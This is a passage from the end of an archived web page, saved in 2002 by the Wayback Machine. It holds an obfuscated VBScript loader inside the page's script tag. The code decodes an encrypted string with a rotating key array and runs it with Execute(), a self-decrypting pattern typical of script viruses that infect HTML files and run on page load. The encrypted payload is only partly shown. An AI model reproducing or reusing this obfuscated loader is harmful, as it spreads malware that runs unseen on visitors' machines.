oymram-0Xd_qgtin*ihg,QgjP[rd  ssqpeg1.\ehsafj*gcdCjdGbCjdDqn]reoh"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 2"&vbCrLf&"KeyArr(1) = 4"&vbCrLf&"KeyArr(2) = 0"&vbCrLf&"KeyArr(3) = 6"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>




<!--
     FILE ARCHIVED ON 13:53:12 Oct 25, 2002 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 19:26:06 Feb 4, 2013.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
